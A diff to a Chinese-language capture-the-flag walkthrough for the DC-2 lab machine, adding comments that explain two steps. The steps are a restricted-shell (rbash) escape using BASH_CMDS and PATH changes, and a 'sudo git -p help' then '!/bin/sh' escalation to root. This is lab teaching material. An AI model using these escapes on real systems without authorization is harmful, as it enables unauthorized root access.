@@ -98,10 +98,10 @@ flag3.txt  usr
 tom@DC-2:~$ cat flag3.txt
 -rbash: cat: command not found
 ```
-- 发现是一个受限的bash,直接bash绕过获取到flag3.txt内容
+- 发现是一个受限的bash,直接rbash绕过获取到flag3.txt内容
 ```
-tom@DC-2:~$ BASH_CMDS[a]=/bin/sh;a
-$ export PATH=$PATH:/bin/
+tom@DC-2:~$ BASH_CMDS[a]=/bin/sh;a # 赋值给a
+$ export PATH=$PATH:/bin/ # 导入环境变量
 $ export PATH=$PATH:/usr/bin
 $ ls
 flag3.txt  usr
@@ -134,7 +134,7 @@ User jerry may run the following commands on DC-2:
 ```
 8. git提权
 ```
-sudo git -p help
+sudo git -p help # -p强制进入交互模式
 !/bin/sh
 ```
 - 直接root权限获取最终finalflag
